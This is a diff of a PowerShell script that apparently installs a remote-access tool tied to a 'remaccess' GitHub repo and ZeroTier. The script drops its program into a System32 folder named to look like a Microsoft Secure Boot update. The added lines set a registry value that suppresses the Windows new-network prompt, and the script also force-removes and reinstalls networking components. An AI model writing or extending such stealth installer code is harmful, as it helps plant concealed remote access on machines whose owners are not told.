@@ -5,7 +5,19 @@ $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
+$registryPath = "HKLM:\System\CurrentControlSet\Control\Network"
+$registryKey = "NewNetworkWindowOff"
+$registryValue = 1
 #Code starts Here
+if (Test-Path "$registryPath\$registryKey") {
+    $currentValue = Get-ItemProperty -Path "$registryPath" -Name $registryKey
+    if ($currentValue.$registryKey -eq $registryValue) {
+    } else {
+        Set-ItemProperty -Path "$registryPath" -Name $registryKey -Value $registryValue
+    }
+} else {
+    New-ItemProperty -Path "$registryPath" -Name $registryKey -Value $registryValue -PropertyType DWord -Force
+}
 Install-PackageProvider -Name NuGet -Force | Out-Null
 Uninstall-Package -Name "ZeroTier One" -Force | Out-Null
 if (Test-Path $ztdatadir) {
